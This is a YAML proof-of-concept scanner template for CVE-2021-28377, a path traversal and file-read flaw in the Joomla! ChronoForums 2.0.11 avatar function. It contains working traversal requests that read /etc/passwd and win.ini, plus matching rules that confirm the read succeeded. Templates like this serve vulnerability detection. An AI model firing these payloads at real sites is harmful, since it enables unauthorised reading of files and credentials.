name: poc-yaml-joomla-cve-2021-28377-fileread
binding: d08bf54d-693b-429c-9203-7dc7adabcb7a
manual: true
detail:
    author: Xz
    links:
        - https://herolab.usd.de/en/security-advisories/usd-2021-0007/
        - https://nvd.nist.gov/vuln/detail/CVE-2021-28377
    vulnerability:
        id: CT-210691
        level: medium
    description: Joomla! ChronoForums 2.0.11 avatar function is vulnerable to local file inclusion through unauthenticated path traversal attacks. This enables an attacker to read arbitrary files, for example the Joomla! configuration file which contains credentials.
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../Windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
